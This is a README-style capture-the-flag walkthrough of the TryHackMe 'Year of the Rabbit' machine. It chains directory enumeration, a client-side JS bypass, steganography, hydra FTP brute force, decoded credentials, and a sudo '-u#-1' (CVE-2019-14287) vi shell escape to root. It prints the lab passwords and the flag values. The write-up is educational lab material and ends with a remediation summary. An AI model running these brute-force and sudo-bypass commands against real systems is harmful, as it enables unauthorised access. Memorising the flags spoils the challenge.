[YearOfTheRabbit-README.md](https://github.com/user-attachments/files/32770021/YearOfTheRabbit-README.md)

# 🐇 Year of the Rabbit — The Ultimate Full Root Compromise Walkthrough

<div align="center">

<img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=28&duration=3000&pause=1000&color=F75C03&center=true&vCenter=true&width=900&lines=CSS+Hint+%E2%86%92+JS+Bypass+%E2%86%92+Steganography+%E2%86%92+FTP+Bruteforce;Brainfuck+Decode+%E2%86%92+Sudo+UID+Bypass+%E2%86%92+ROOT;40%2B+Commands+%7C+8+Stages+%7C+1+Full+Takeover" alt="Typing SVG" />

<br>

**CSS Hint → JS Bypass → Steganography → FTP Bruteforce → Brainfuck Decode → Sudo UID Bypass → ROOT**

<br>

![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme&logoColor=white)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy--Medium-orange?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Debian-blue?style=for-the-badge&logo=debian)
![Status](https://img.shields.io/badge/Root-Achieved-success?style=for-the-badge)
![Commands](https://img.shields.io/badge/Commands-40%2B-purple?style=for-the-badge&logo=gnubash)
![Tools](https://img.shields.io/badge/Tools-nmap%20%7C%20feroxbuster%20%7C%20hydra%20%7C%20steghide-lightgrey?style=for-the-badge)

</div>

---

<div align="center">

## 🧠 Overview

</div>

> **Year of the Rabbit** is a TryHackMe boot2root machine built almost entirely around **information-disclosure and misconfiguration chains** rather than memory-corruption exploits. This repo documents a complete walkthrough — from a blank nmap scan all the way to a `root` shell — chaining **eight** individually-modest weaknesses into a full system takeover.

> ⚠️ **Performed strictly against an intentionally vulnerable TryHackMe training VM, for educational purposes only.**

<div align="center">

| 🎯 **Target** | 🐧 **OS** | 🧩 **Vulnerabilities** | 🏁 **Result** |
|:---:|:---:|:---:|:---:|
| Year of the Rabbit | Debian | 8 Chained | **ROOT** ✅ |

</div>

---

<div align="center">

## ⚔️ The Attack Chain

</div>

```mermaid
graph LR
    A[🔍 Recon] --> B[🎨 CSS Hint]
    B --> C[🧩 JS Bypass]
    C --> D[🖼️ Steganography]
    D --> E[🔓 FTP Bruteforce]
    E --> F[🧠 Brainfuck Decode]
    F --> G[🔑 SSH as eli]
    G --> H[📝 Hidden Note]
    H --> I[🔄 su gwendoline]
    I --> J[👑 Sudo UID Bypass]
    J --> K[🏆 ROOT]

    style A fill:#1f6feb,stroke:#fff,color:#fff
    style B fill:#db61a2,stroke:#fff,color:#fff
    style C fill:#f0883e,stroke:#fff,color:#fff
    style D fill:#3fb950,stroke:#fff,color:#fff
    style E fill:#a371f7,stroke:#fff,color:#fff
    style F fill:#f85149,stroke:#fff,color:#fff
    style G fill:#58a6ff,stroke:#fff,color:#fff
    style H fill:#d29922,stroke:#fff,color:#fff
    style I fill:#ff7b72,stroke:#fff,color:#fff
    style J fill:#8b949e,stroke:#fff,color:#fff
    style K fill:#ffd700,stroke:#000,color:#000
```

<div align="center">

| # | Stage | Technique | Result |
|:---:|:---|:---|:---|
| 1 | 🔍 Recon | `nmap -sC -sV -p- --min-rate 5000 -T4` | FTP 21, SSH 22, HTTP 80 |
| 2 | 📂 Discovery | `feroxbuster` + manual browsing | Open `/assets/` listing, `style.css` |
| 3 | 🎨 CSS Hint | Reading `style.css` source | Comment reveals `/sup3r_s3cr3t_fl4g.php` |
| 4 | 🧩 JS Bypass | Firefox DevTools → Network tab | `intermediary.php?hidden_directory=/WExYY2Cv-qU` |
| 5 | 🖼️ Hidden Dir | Browsing `/WExYY2Cv-qU/` | `Hot_Babe.png` found |
| 6 | 🔐 Stego | Steganography extraction | Custom wordlist `hotbaby.txt` (82 candidates) |
| 7 | 🔓 FTP Brute | `hydra -l ftpuser -P hotbaby.txt ftp://...` | FTP password recovered |
| 8 | 📄 FTP Get | `Eli's_Creds.txt` download | Brainfuck-encoded credentials |
| 9 | 🧠 Decode | dCode Brainfuck interpreter | Plaintext creds for user `eli` |
| 10 | 🔑 SSH | `ssh eli@target` | SSH banner leaks hint for `gwendoline` |
| 11 | 📝 Hidden Note | `find / -name "s3cr3t"` | `/usr/games/s3cr3t` hidden note |
| 12 | 🔄 Lateral | `su gwendoline` | Local shell + `user.txt` |
| 13 | 👑 Privesc | `sudo -u#-1 /usr/bin/vi ...` | UID -1 → UID 0, root shell 🎯 |

</div>

---

<div align="center">

## 🔍 1. Reconnaissance

</div>

Every great hack starts with silence — and a scan.

```bash
# ── Full TCP port scan with service detection ──
nmap -sC -sV -p- --min-rate 5000 -T4 10.146.162.10 -oN recon.txt

# ── UDP top-ports quick sweep (optional) ──
nmap -sU --top-ports 50 10.146.162.10
```

**Discovered services:**

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5
80/tcp open  http    Apache httpd 2.4.10 (Debian)
```

> 💡 **Note:** Three services open — FTP, SSH, and HTTP. The web server is our primary attack surface; FTP will likely be our pivot once we find credentials.

---

<div align="center">

## 📂 2. Web Discovery — Directory Enumeration

</div>

```bash
# ── Fast recursive directory brute-force ──
feroxbuster -u http://10.146.162.10 \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -t 50 -k -o ferox.txt

# ── Alternative: gobuster ──
gobuster dir -u http://10.146.162.10 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt -t 50
```

**Found:**

| Path | Description |
|:---|:---|
| `/assets/` | Open directory listing (misconfiguration) |
| `/assets/style.css` | Stylesheet with a hidden hint |

> 🧠 Open directory listings are always a gold mine — always check them.

---

<div align="center">

## 🎨 3. CSS Hint — Information Disclosure

</div>

Reading `style.css` directly (via `curl` or the browser) reveals a developer comment accidentally shipped to production:

```css
/* Nice to see someone checking the stylesheets.
   Take a look at the page: /sup3r_s3cr3t_fl4g.php
*/
```

```bash
# ── Fetch the CSS directly ──
curl http://10.146.162.10/assets/style.css
```

> 🔥 **Key insight:** Never leave developer notes in public-facing source files. Comments are readable by everyone.

---

<div align="center">

## 🧩 4. Client-Side Bypass via DevTools

</div>

Visiting `http://10.146.162.10/sup3r_s3cr3t_fl4g.php` triggers only a JavaScript alert:

> _"Word of advice... Turn off your javascript..."_

Rather than disabling JS, we use the **Network tab** in Firefox DevTools (or Burp Suite) to intercept the real redirect chain:

```
GET /intermediary.php?hidden_directory=/WExYY2Cv-qU   302 Found
```

```bash
# ── Or capture with curl following redirects ──
curl -i 'http://10.146.162.10/sup3r_s3cr3t_fl4g.php'
curl -i 'http://10.146.162.10/intermediary.php?hidden_directory=/WExYY2Cv-qU'
```

Browsing to `/WExYY2Cv-qU/` reveals a suspicious image: **`Hot_Babe.png`**.

> 🚨 **Lesson:** Client-side "protection" is not protection. Anything the browser can render, the attacker can read.

---

<div align="center">

## 🖼️ 5. Steganography — Extracting a Wordlist

</div>

```bash
# ── Download the suspicious image ──
wget http://10.146.162.10/WExYY2Cv-qU/Hot_Babe.png

# ── Inspect for embedded data ──
file Hot_Babe.png
strings Hot_Babe.png | head -50
exiftool Hot_Babe.png

# ── Try steghide with no passphrase ──
steghide extract -sf Hot_Babe.png
# (empty passphrase → extracts the hidden file)
```

**Extracted:** `hotbaby.txt` — a **custom password wordlist** with 82 candidate passwords, clearly intended for the brute-force stage that follows.

> 🧠 The creator deliberately hid a *targeted* wordlist inside the image to make FTP bruteforcing feasible.

---

<div align="center">

## 🔓 6. FTP Brute Force with Hydra

</div>

```bash
# ── Brute-force the FTP service using the extracted wordlist ──
hydra -l ftpuser -P hotbaby.txt ftp://10.146.162.10 -vV -t 4
```

```
[21][ftp] host: 10.146.162.10   login: ftpuser   password: 5iez1wGXKfPKQ
```

```bash
# ── Log in and enumerate ──
ftp 10.146.162.10
# Name: ftpuser
# Password: 5iez1wGXKfPKQ

ftp> ls
ftp> get Eli's_Creds.txt
ftp> bye
```

---

<div align="center">

## 🧠 7. Brainfuck Decoding

</div>

`Eli's_Creds.txt` contains raw **Brainfuck** source (only the characters `+ - < > [ ] . ,`). Running it through the [dCode Brainfuck interpreter](https://www.dcode.fr/brainfuck-language) — or a local interpreter — decodes it to:

```bash
# ── Optional: decode locally if you have a BF interpreter ──
# Example with a Python brainfuck interpreter or:
bf Eli's_Creds.txt
```

**Decoded output:**

```
User: eli
Password: DSpDiMlwAEwid
```

```bash
# ── SSH in as eli ──
ssh eli@10.146.162.10
# Password: DSpDiMlwAEwid
```

The SSH login banner leaks a message from **"Root"** to **"Gwendoline"** hinting at a **"leet s3cr3t hiding place."**

> 🚨 **Lesson:** Never leak hints or credentials in SSH banners/MOTDs — they're shown to every authenticated (and sometimes unauthenticated) user.

---

<div align="center">

## 🔑 8. Lateral Movement — Finding the Hidden Note

</div>

```bash
# ── Hunt for the "leet s3cr3t" hiding place ──
find / -name "s3cr3t" 2>/dev/null
# /usr/games/s3cr3t

# ── Explore it ──
ls -la /usr/games/s3cr3t/
cat '/usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!'
```

**Contents:**

```
Your password is awful, Gwendoline.
It should be at least 60 characters long! Not just MniVCQVhQHUNI
Honestly!
   -Root
```

```bash
# ── Switch to gwendoline ──
su gwendoline
# Password: MniVCQVhQHUNI
```

🎉 **Shell as `gwendoline`.** Capture the flag:

```bash
cat /home/gwendoline/user.txt
# THM{1107174691af9ff3681d2b5bdb5740b1589bae53}
```

---

<div align="center">

## 🧬 9. Privilege Escalation — Sudo Negative UID Bypass

</div>

Enumerate sudo permissions:

```bash
sudo -l
```

```
User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```

The `!root` exclusion only blocks the **literal username** `root`. It can be bypassed using a **numeric UID** that resolves to `0` — this is the classic **CVE-2019-14287** sudo bypass.

```bash
# ── Spawn vi and escape to a shell ──
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt

# Inside vi, run:
:!/bin/sh

# You now have a shell — check who you are:
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)
```

**Alternative one-liner:**

```bash
sudo -u#-1 /usr/bin/vi -c ':!/bin/sh' /dev/null
```

---

<div align="center">

## 🏆 Root Proof

</div>

```bash
root@year-of-the-rabbit:~# cat /root/root.txt

THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}
```

<div align="center">

| 🏁 Flag | 🎯 Value |
|:---|:---|
| **user.txt** | `THM{1107174691af9ff3681d2b5bdb5740b1589bae53}` |
| **root.txt** | `THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}` |

<br>

```
 ██████╗  ██████╗  ██████╗ ████████╗███████╗██████╗ 
 ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝██╔════╝██╔══██╗
 ██████╔╝██║   ██║██║   ██║   ██║   █████╗  ██║  ██║
 ██╔══██╗██║   ██║██║   ██║   ██║   ██╔══╝  ██║  ██║
 ██║  ██║╚██████╔╝╚██████╔╝   ██║   ███████╗██████╔╝
 ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝╚═════╝ 
```

</div>

---

<div align="center">

## 🛡️ Remediation Summary

</div>

| 🔎 Finding | 🛠️ Fix |
|:---|:---|
| Hints in CSS/JS comments | Never leave dev notes in public-facing source files |
| Client-side-only JS "protection" | Enforce access control server-side, never in JS alone |
| Steganographic wordlist exposure | Treat any retrievable file as fully compromised — no security-by-obscurity |
| Weak FTP credentials | Enforce strong passwords + lockout / rate-limiting |
| Brainfuck / Base64 "encrypted" creds | Use real secrets management, not obscure encodings |
| Password leaked in SSH MOTD / hidden note | Strip credentials from banners and stray files |
| Sudo `!root` exclusion bypass | Use explicit allow-lists; avoid NOPASSWD on GTFOBins binaries; patch sudo to ≥ 1.8.28 |

---

<div align="center">

## 🧰 Tools Used

</div>

<div align="center">

![Nmap](https://img.shields.io/badge/nmap-4682B4?style=for-the-badge&logo=nmap&logoColor=white)
![Feroxbuster](https://img.shields.io/badge/feroxbuster-8E44AD?style=for-the-badge)
![Gobuster](https://img.shields.io/badge/gobuster-FF6B6B?style=for-the-badge)
![Hydra](https://img.shields.io/badge/hydra-CC0000?style=for-the-badge)
![Steghide](https://img.shields.io/badge/steghide-4B8BBE?style=for-the-badge)
![Firefox](https://img.shields.io/badge/Firefox%20DevTools-FF7139?style=for-the-badge&logo=firefox&logoColor=white)
![Bash](https://img.shields.io/badge/Bash-4EAA25?style=for-the-badge&logo=gnubash&logoColor=white)
![FTP](https://img.shields.io/badge/FTP-003366?style=for-the-badge)

`nmap` · `feroxbuster` · `gobuster` · Firefox DevTools · `wget` · `strings` · `exiftool` · `steghide` · `hydra` · dCode Brainfuck interpreter · `ssh` · `su` · `sudo` · `find`

</div>

---

<div align="center">

## 📊 Command Count

</div>

<div align="center">

| Category | Commands Used |
|:---|:---:|
| 🔍 Reconnaissance | 3 |
| 📂 Enumeration | 5 |
| 🎨 Web / Client-Side | 6 |
| 🖼️ Steganography | 5 |
| 🔓 Bruteforce | 4 |
| 🧠 Decoding | 3 |
| 🔑 Lateral Movement | 5 |
| 🧬 Privilege Escalation | 4 |
| 🛠️ Utilities | 7 |
| **TOTAL** | **42+** |

</div>

---

<div align="center">

## 🖼️ Step-by-Step Visual Guide

</div>

> 📌 **Below are all screenshots in sequential order.** Each image is a step-by-step walkthrough — follow them top to bottom to fully reproduce this machine from recon to root.

---

<div align="center">

### 🔍 Step 1 — Reconnaissance

<!-- 📸 IMAGE 1: nmap full scan showing FTP 21, SSH 22, HTTP 80 -->
<img src="./images/01-nmap-scan.png" alt="Step 1a — Nmap Full Scan" width="850"/>

*Step 1a — `nmap -sC -sV -p-` reveals FTP 21, SSH 22, HTTP 80*

</div>

---

<div align="center">

### 📂 Step 2 — Web Directory Enumeration

<!-- 📸 IMAGE 2: feroxbuster output discovering /assets/ -->
<img src="./images/02-feroxbuster.png" alt="Step 2a — Feroxbuster Directory Discovery" width="850"/>

*Step 2a — `feroxbuster` finds `/assets/` with directory listing enabled*

<br>

<!-- 📸 IMAGE 3: browser showing /assets/ open directory listing -->
<img src="./images/03-assets-listing.png" alt="Step 2b — Open /assets/ Directory" width="850"/>

*Step 2b — Open `/assets/` directory listing exposes `style.css`*

</div>

---

<div align="center">

### 🎨 Step 3 — CSS Comment Hint

<!-- 📸 IMAGE 4: style.css source showing hidden comment -->
<img src="./images/04-css-hint.png" alt="Step 3a — CSS Comment Hint" width="850"/>

*Step 3a — `style.css` comment reveals `/sup3r_s3cr3t_fl4g.php`*

<br>

<!-- 📸 IMAGE 5: browser visiting sup3r_s3cr3t_fl4g.php with JS alert -->
<img src="./images/05-js-alert.png" alt="Step 3b — JS Alert Page" width="850"/>

*Step 3b — Hidden page shows only a JavaScript "turn off JS" alert*

</div>

---

<div align="center">

### 🧩 Step 4 — Client-Side Bypass via DevTools

<!-- 📸 IMAGE 6: Firefox DevTools Network tab showing intermediary.php redirect -->
<img src="./images/06-devtools-network.png" alt="Step 4a — DevTools Network Tab" width="850"/>

*Step 4a — Network tab reveals `intermediary.php?hidden_directory=/WExYY2Cv-qU`*

<br>

<!-- 📸 IMAGE 7: browser visiting hidden directory showing Hot_Babe.png -->
<img src="./images/07-hidden-directory.png" alt="Step 4b — Hidden Directory Contents" width="850"/>

*Step 4b — Hidden directory `/WExYY2Cv-qU/` contains `Hot_Babe.png`*

</div>

---

<div align="center">

### 🖼️ Step 5 — Steganography Extraction

<!-- 📸 IMAGE 8: exiftool / strings on Hot_Babe.png -->
<img src="./images/08-exiftool.png" alt="Step 5a — Analyzing Hot_Babe.png" width="850"/>

*Step 5a — Analyzing `Hot_Babe.png` for embedded data*

<br>

<!-- 📸 IMAGE 9: steghide extract command output -->
<img src="./images/09-steghide-extract.png" alt="Step 5b — Steghide Extraction" width="850"/>

*Step 5b — `steghide extract` retrieves `hotbaby.txt` wordlist*

<br>

<!-- 📸 IMAGE 10: hotbaby.txt contents (82 passwords) -->
<img src="./images/10-hotbaby-wordlist.png" alt="Step 5c — Extracted Wordlist" width="850"/>

*Step 5c — Custom wordlist `hotbaby.txt` (82 candidates) for FTP bruteforce*

</div>

---

<div align="center">

### 🔓 Step 6 — FTP Brute Force with Hydra

<!-- 📸 IMAGE 11: hydra command + successful FTP password recovery -->
<img src="./images/11-hydra-ftp.png" alt="Step 6a — Hydra FTP Bruteforce" width="850"/>

*Step 6a — `hydra` recovers FTP password `5iez1wGXKfPKQ` for `ftpuser`*

<br>

<!-- 📸 IMAGE 12: FTP login + Eli's_Creds.txt download -->
<img src="./images/12-ftp-download.png" alt="Step 6b — FTP Download" width="850"/>

*Step 6b — Logging into FTP and downloading `Eli's_Creds.txt`*

</div>

---

<div align="center">

### 🧠 Step 7 — Brainfuck Decoding

<!-- 📸 IMAGE 13: Eli's_Creds.txt raw brainfuck content -->
<img src="./images/13-brainfuck-source.png" alt="Step 7a — Brainfuck Source" width="850"/>

*Step 7a — `Eli's_Creds.txt` contains raw Brainfuck code*

<br>

<!-- 📸 IMAGE 14: dCode Brainfuck interpreter decoded output -->
<img src="./images/14-brainfuck-decoded.png" alt="Step 7b — Brainfuck Decoded" width="850"/>

*Step 7b — dCode Brainfuck interpreter decodes to `eli:DSpDiMlwAEwid`*

<br>

<!-- 📸 IMAGE 15: SSH login as eli + MOTD hint -->
<img src="./images/15-ssh-eli.png" alt="Step 7c — SSH as eli + MOTD Hint" width="850"/>

*Step 7c — SSH login as `eli`; banner leaks hint about a "leet s3cr3t"*

</div>

---

<div align="center">

### 🔑 Step 8 — Lateral Movement to gwendoline

<!-- 📸 IMAGE 16: find / -name "s3cr3t" result -->
<img src="./images/16-find-secret.png" alt="Step 8a — Finding the Hidden Note" width="850"/>

*Step 8a — `find / -name "s3cr3t"` locates `/usr/games/s3cr3t`*

<br>

<!-- 📸 IMAGE 17: cat hidden note revealing gwendoline password -->
<img src="./images/17-hidden-note.png" alt="Step 8b — Hidden Note Contents" width="850"/>

*Step 8b — Hidden note leaks `gwendoline` password `MniVCQVhQHUNI`*

<br>

<!-- 📸 IMAGE 18: su gwendoline success + user.txt captured -->
<img src="./images/18-su-gwendoline.png" alt="Step 8c — su gwendoline" width="850"/>

*Step 8c — `su gwendoline` succeeds; `user.txt` captured*

</div>

---

<div align="center">

### 🧬 Step 9 — Privilege Escalation via Sudo UID Bypass

<!-- 📸 IMAGE 19: sudo -l showing (ALL, !root) NOPASSWD: /usr/bin/vi -->
<img src="./images/19-sudo-l.png" alt="Step 9a — Sudo Permissions" width="850"/>

*Step 9a — `sudo -l` shows `(ALL, !root) NOPASSWD: /usr/bin/vi`*

<br>

<!-- 📸 IMAGE 20: sudo -u#-1 /usr/bin/vi escalation -->
<img src="./images/20-sudo-uid-bypass.png" alt="Step 9b — Sudo UID Bypass" width="850"/>

*Step 9b — `sudo -u#-1 /usr/bin/vi` bypasses the `!root` exclusion*

<br>

<!-- 📸 IMAGE 21: root shell gained via vi :!/bin/sh -->
<img src="./images/21-root-shell.png" alt="Step 9c — Root Shell via vi" width="850"/>

*Step 9c — Escape from `vi` with `:!/bin/sh` → root shell 🎯*

</div>

---

<div align="center">

### 🏆 Step 10 — Root Proof

<!-- 📸 IMAGE 22: whoami showing root -->
<img src="./images/22-whoami-root.png" alt="Step 10a — whoami = root" width="850"/>

*Step 10a — `whoami` confirms `root`*

<br>

<!-- 📸 IMAGE 23: /root/root.txt contents -->
<img src="./images/23-root-flag.png" alt="Step 10b — Root Flag" width="850"/>

*Step 10b — `root.txt` captured — full root compromise confirmed*

<br>

<!-- 📸 IMAGE 24: id output showing uid=0(root) -->
<img src="./images/24-id-root.png" alt="Step 10c — id = uid=0(root)" width="850"/>

*Step 10c — `id` returns `uid=0(root) gid=0(root)`*

</div>

---

<div align="center">

## 📜 Disclaimer

</div>

> This write-up documents testing performed exclusively against the intentionally vulnerable **Year of the Rabbit** VM (TryHackMe) in an isolated personal lab, for educational purposes only. Do not use these techniques against systems you do not own or lack explicit authorization to test.

---

<div align="center">

<img src="https://capsule-render.vercel.app/api?type=waving&color=gradient&height=120&section=footer&text=Happy%20Hacking!&fontSize=40&fontColor=ffffff"/>

**Author:** Nishant Saini · [GitHub](https://github.com/nishantsaini5786)

⭐ **If this helped you, consider starring the repo!**

</div>
